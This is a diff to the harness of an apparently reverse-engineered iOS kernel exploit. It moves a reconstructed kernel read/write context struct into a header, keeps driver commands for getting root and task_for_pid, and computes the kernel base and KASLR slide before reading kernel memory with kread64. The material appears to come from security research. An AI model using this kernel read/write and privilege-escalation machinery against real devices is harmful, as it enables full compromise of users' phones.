@@ -1,6 +1,7 @@
 @import Darwin;
 @import MachO;
 @import Foundation;
+#import "defs.h"
 
 #define CS_GET_TASK_ALLOW           0x00000004  /* has get-task-allow entitlement */
 #define CS_HARD                     0x00000100  /* don't load invalid pages */
@@ -14,51 +15,7 @@
 #define DRIVER_CMD_TASK_GET_ROOT 26
 #define DRIVER_CMD_TASK_FOR_PID 0xc000001d
 
-//typedef struct {
-//    uint8_t __unk[7520];
-//} krw_ctx_t;
-
-typedef struct struct_krwCtx // sizeof=0x1D50
-{
-    uint32_t flags;
-    uint8_t gap_0x4[168];
-    uint32_t threadForKernelRead;
-    uint8_t gap_0xB0[144];
-    int xnuMajorVersion;
-    uint8_t gap_0x144[20];
-    uint64_t someLargeNumber;
-    uint8_t gap_0x160[8];
-    int stride_0x168;
-    int gap_0x16C[7];
-    uint64_t pageMask;
-    uint8_t gap_0x190[136];
-    uint64_t gap_0x218;
-    uint8_t gap_0x220[56];
-    int isRW;
-    struct mach_timebase_info timebase;
-    mach_port_t semaphore;
-    pthread_mutex_t someMutex;
-    uint32_t someInt1;
-    uint32_t someInt2;
-    uint64_t gap_0x2B0[16];
-    pthread_mutex_t someMutex2;
-    uint64_t gap_0x370[695];
-    uint32_t gap_0x1928;
-    uint32_t gap_0x192C;
-    uint32_t krw_pipe_0[2];
-    uint32_t gap_0x1938;
-    uint32_t gap_0x193C;
-    uint32_t gap_0x1940;
-    uint32_t gap_0x1944;
-    uint64_t gap_0x1948[16];
-    uint64_t machHeaderPlus0x8000;
-    uint64_t gap_0x19D0;
-    uint64_t gap_0x19D8;
-    uint64_t slideMaybe;
-    uint64_t gap_0x19E8[108];
-    uint64_t IOKitConnInfo;
-} krw_ctx_t;
-
+typedef struct_krwCtx krw_ctx_t;
 typedef struct module_vtable module_vtable_t;
 typedef int (*driver_init_t)(module_vtable_t *vtable, uint64_t arg1, krw_ctx_t **ctx_out);
 typedef int (*driver_free_t)(module_vtable_t *vtable);
@@ -205,13 +162,13 @@ int main(int argc, char *argv[], char *envp[]) {
     printf("Driver initialized, ctx: %p\n", global_ctx);
     
     
-    printf("slideMaybe=0x%llx\n", global_ctx->slideMaybe);
+    //printf("slideMaybe=0x%llx\n", global_ctx->slideMaybe);
     
     kernelbase = global_ctx->machHeaderPlus0x8000 - 0x8000;
     slide = kernelbase - 0xfffffff007004000;
     
-    NSLog(@"kernel base: 0x%llx\n", kernelbase);
-    NSLog(@"kernel slide: 0x%llx\n", slide);
+    printf("kernel base: 0x%llx\n", kernelbase);
+    printf("kernel slide: 0x%llx\n", slide);
     uint64_t val = kread64(kernelbase);
     printf("Kernel header: 0x%llx\n", val);
     
